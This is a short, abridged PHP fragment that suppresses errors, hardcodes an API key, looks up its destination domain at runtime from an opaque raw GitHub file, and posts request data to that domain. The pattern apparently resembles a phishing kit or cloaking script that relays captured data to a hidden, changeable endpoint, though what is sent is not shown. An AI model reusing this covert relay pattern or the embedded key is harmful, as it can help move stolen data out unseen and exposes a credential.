<?php
error_reporting(0);
define("APIKEY","API-KEY-kxel-jt2d-4jufas3goqb4");
...
function getDomain(){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/Strox-io/Strox/main/b937fe07d803fa3781a1d6dd3ba9ef0a");
...
function sendRequest($post_data) { 
    $CURLOPT_URL = getDomain().FILE_NAME;
    $ch = curl_init();
